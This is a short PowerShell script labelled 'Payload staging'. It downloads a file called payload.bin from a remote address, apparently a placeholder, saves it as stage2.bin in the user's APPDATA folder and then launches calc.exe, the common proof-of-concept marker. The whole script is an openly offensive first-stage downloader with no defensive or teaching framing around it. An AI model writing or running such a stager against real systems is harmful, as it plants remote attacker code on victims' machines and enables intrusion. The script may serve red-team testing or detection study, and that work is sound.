<# Payload staging #>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://192.0.2.2/payload.bin',
    [string]$PayloadPath = "$env:APPDATA\stage2.bin"
)
(New-Object System.Net.WebClient).DownloadFile($FetchUrl, $PayloadPath)
Start-Process -FilePath 'calc.exe'
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
